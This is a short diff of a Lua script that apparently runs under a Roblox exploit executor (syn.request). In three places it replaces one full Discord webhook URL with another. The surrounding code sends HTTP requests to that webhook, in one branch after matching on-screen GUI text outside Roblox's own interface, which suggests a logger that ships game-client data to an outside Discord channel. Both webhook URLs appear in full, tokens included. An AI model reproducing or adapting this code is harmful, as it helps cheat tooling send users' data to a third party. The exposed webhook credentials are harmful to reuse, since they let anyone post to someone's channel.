@@ -1519,7 +1519,7 @@ local function LPHJTO_fake_script() -- Main.Webhook
 	local script = Instance.new('LocalScript', Main)
 
 	local h = game.HttpService
-	local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+	local webUrl = "https://discord.com/api/webhooks/1068471100339662970/yvDm0vjnvO6y6h_oJtkSJQXVMqY4yin2x6DoQjvPc-fLtiYKY4jiKqxyMX2-2eEhbM3d"
 	
 	local responce = syn.request(
 		{
@@ -1618,7 +1618,7 @@ local function FTTBG_fake_script() -- Main.Test
 	
 	
 					local h = game.HttpService
-					local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+					local webUrl = "https://discord.com/api/webhooks/1068471100339662970/yvDm0vjnvO6y6h_oJtkSJQXVMqY4yin2x6DoQjvPc-fLtiYKY4jiKqxyMX2-2eEhbM3d"
 	
 					local responce = syn.request(
 						{
@@ -1681,7 +1681,7 @@ local function FTTBG_fake_script() -- Main.Test
 									if ancestor_name ~= "RobloxGui" and ancestor_name ~= "TopBar" and ancestor_name ~= "DevConsoleMaster" then
 										if text == v4 then
 											local h = game.HttpService
-											local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+											local webUrl = "https://discord.com/api/webhooks/1068471100339662970/yvDm0vjnvO6y6h_oJtkSJQXVMqY4yin2x6DoQjvPc-fLtiYKY4jiKqxyMX2-2eEhbM3d"
 	
 											local responce = syn.request(
 												{
